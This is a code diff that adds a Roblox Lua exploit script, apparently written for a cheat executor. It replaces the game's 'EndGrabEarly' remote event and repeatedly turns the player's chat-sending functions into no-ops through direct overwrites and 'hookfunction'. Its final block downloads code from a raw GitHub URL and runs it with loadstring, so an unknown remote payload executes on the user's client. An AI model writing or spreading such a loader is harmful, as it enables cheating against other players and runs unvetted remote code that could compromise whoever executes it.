@@ -1,0 +1,67 @@
+local Rs = game:GetService("ReplicatedStorage")
+local rs2 = game:GetService("RunService")
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+
+pcall(function()
+    local G = Rs:WaitForChild("GrabEvents", 5)
+    if G then
+        local endGrab = G:FindFirstChild("EndGrabEarly")
+        if endGrab then endGrab:Destroy() end
+        Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            local ev = Rs:FindFirstChild("DefaultChatSystemChatEvents")
+            if ev then
+                local say = ev:FindFirstChild("SayMessageRequest")
+                if say and typeof(say.FireServer) == "function" and say.FireServer ~= function() end then
+                    say.FireServer = function() end
+                end
+            end
+        end)
+        task.wait(1)
+    end
+end)
+
+task.spawn(function()
+    local TextChatService = game:GetService("TextChatService")
+    
+    local function try_patch(channel)
+        pcall(function()
+            if channel and channel.ClassName == "TextChannel" then
+                pcall(function() channel.SendAsync = function() end end)
+                if channel.SendAsync ~= function() end and hookfunction and typeof(channel.SendAsync) == "function" then
+                    pcall(function()
+                        local orig = channel.SendAsync
+                        hookfunction(orig, function() end)
+                    end)
+                end
+            end
+        end)
+    end
+
+    while true do
+        pcall(function()
+            local textChannels = TextChatService:FindFirstChild("TextChannels")
+            if textChannels then
+                for _, c in ipairs(textChannels:GetChildren()) do
+                    try_patch(c)
+                end
+            end
+        end)
+        task.wait(0.5)
+    end
+end)
+
+task.delay(0.15, function()
+    local ok, res = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/뭐노"))()
+    end)
+    if not ok then
+        warn("Noob loader failed:", res)
+    end
+end)
